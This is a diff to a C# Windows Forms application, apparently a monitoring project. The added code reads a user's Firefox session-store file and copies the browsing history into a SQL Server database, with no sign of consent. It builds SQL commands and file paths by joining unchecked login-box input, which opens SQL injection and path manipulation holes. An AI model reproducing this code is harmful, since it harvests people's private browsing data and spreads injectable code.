@@ -9,6 +9,7 @@ using System.Threading.Tasks;
 using System.Windows.Forms;
 using System.Data.SqlClient;
 using System.Data.SqlTypes;
+using System.IO;
 
 namespace IPsec
 {
@@ -483,7 +484,7 @@ namespace IPsec
             {
                 MessageBox.Show(@"Ошибка соединения");
             }
-
+            //////
             string Hist = string.Empty;
             string Adress = @"C:\Users\" + LogintextBox.Text + @"\AppData\Roaming\Mozilla\Firefox\Profiles\kpe8hvti.default\sessionstore-backups\recovery.js";
             using (System.IO.StreamReader reader = System.IO.File.OpenText(Adress))
@@ -492,22 +493,27 @@ namespace IPsec
             }
             Hist = Hist.Replace("url", "\n");
             
-
-            
-/*
-            string WriteHist = "INSERT INTO [dbo].[BrowserHistory] ([id],[UserID],[Sites]) VALUES (1, 1,'" + Hist + "')";
-            SqlCommand cmdWriteHist = new SqlCommand(WriteHist, con);
-            // cmdWriteHist.ExecuteNonQuery();
-*/
-            using (System.IO.StreamWriter file = new System.IO.StreamWriter(@"D:\tEST\test.txt"))
+             //////    
+            using (System.IO.StreamWriter file = new System.IO.StreamWriter(@"D:\tEST\Test\" + LogintextBox.Text + @".txt"))
             {
                 file.Write(Hist);
             }
 
+            //////
+            StreamReader fs = new StreamReader(@"D:\tEST\Test\" + LogintextBox.Text + @".txt");
+
+            string s = "";
+            while (s != null)
+            {
+                s = fs.ReadLine();
 
 
-
-
+                string WriteHist = "EXECUTE [dbo].[InsertBrowserHistory] @LoginName='" + LogintextBox.Text + "' , @Sites='" + s + "'";
+                SqlCommand cmdWriteHist = new SqlCommand(WriteHist, con);
+                cmdWriteHist.ExecuteNonQuery();
+            }
+            fs.Close();
+            File.Delete(@"D:\tEST\Test\" + LogintextBox.Text + @".txt");
 
 
 
